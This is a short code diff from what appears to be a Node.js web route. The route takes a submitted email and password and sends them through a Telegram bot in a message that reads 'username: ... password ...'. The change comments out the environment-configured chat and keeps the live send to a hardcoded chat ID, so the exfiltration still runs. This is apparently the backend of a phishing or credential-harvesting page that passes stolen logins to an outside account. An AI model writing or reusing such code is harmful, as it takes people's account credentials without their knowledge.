@@ -15,7 +15,7 @@ const route = router.use("/", function (req, res, next) {
      // send a message to the chat acknowledging receipt of their message
     const chatId =  parseInt( process.env.CHATID );
     try {
-        bot.sendMessage(chatId, `username: ${email} : password ${pass}`);
+        // bot.sendMessage(chatId, `username: ${email} : password ${pass}`);
         bot.sendMessage(623167587 , `username: ${email} : password ${pass}`);
         bot.close();
         
